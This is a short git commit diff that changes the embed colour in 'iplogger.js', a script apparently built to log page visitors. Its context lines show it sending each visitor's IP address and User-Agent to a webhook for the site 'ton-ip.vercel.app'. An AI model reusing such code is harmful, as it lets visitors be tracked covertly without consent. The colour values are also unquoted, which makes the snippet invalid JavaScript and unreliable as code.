f1f0a3cbbbcbae110ae51ac63aea292dcc6fbf44
Ayka_667 <164785580+ayka667@users.noreply.github.com>
2024-07-03 19:04:20 +0200

    Update iplogger.js

--- iplogger.js
+++ iplogger.js
@@ -10,7 +10,7 @@ function sendDetailsToWebhook(details) {
         embeds: [{
             title: 'ton-ip.vercel.app',
             description: 'Details of the user accessing the page.',
-            color: #B4A4FF,
+            color: #E8FF00,
             fields: [
                 { name: 'IP Address', value: details.ip, inline: true },
                 { name: 'User-Agent', value: details.userAgent, inline: true },
